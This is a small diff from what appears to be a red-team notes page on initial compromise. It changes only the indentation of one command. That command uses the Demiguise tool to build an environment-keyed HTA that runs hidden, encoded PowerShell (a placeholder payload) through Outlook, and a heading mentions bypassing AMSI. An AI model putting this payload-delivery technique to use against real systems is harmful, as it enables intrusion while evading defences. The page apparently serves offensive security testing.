@@ -9,7 +9,7 @@ categories: InitialCompromise
 
 Using a simple keying HTA payload, such as those created by the Demiguise tool from NCC can be useful in landing the second stage of a payload.
 
-demiguise.py -k "environmentKey" -c "powershell.exe -nop -w 1 -enc ENC_PAYLOAD" -o hta.hta -p Outlook.Application
+    demiguise.py -k "environmentKey" -c "powershell.exe -nop -w 1 -enc ENC_PAYLOAD" -o hta.hta -p Outlook.Application
 
 ## Bypassing AMSI and Delivering Payloads
 
